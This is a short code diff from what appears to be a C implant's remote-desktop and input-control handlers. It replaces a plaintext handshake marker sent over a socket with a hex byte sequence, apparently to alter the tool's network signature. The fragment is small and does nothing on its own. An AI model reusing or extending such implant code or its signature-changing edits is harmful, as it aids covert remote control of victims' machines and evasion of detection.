@@ -339,7 +339,7 @@ SECTION( C ) DWORD WINAPI DesktopHandler( PARGS pArgs )
         goto cleanup;
     };
 
-    if( pArgs->pApi->ws2_32.send( s, C_PTR( OFFSET( "WKLWKL" ) ), 7, 0 ) <= 0 )
+    if( pArgs->pApi->ws2_32.send( s, C_PTR( OFFSET( "\xDE\xAD\xBE\xEF\xCA\xFE" ) ), 6, 0 ) <= 0 )
     {
         goto cleanup;
     };
@@ -505,7 +505,7 @@ SECTION( B ) DWORD WINAPI InputHandler( PARGS *ppArgs )
         goto cleanup;
     };
 
-    if( pArgs->pApi->ws2_32.send( s, C_PTR( OFFSET( "WKLWKL" ) ), 7, 0 ) <= 0 )
+    if( pArgs->pApi->ws2_32.send( s, C_PTR( OFFSET( "\xDE\xAD\xBE\xEF\xCA\xFE" ) ), 6, 0 ) <= 0 )
     {
         goto cleanup;
     };
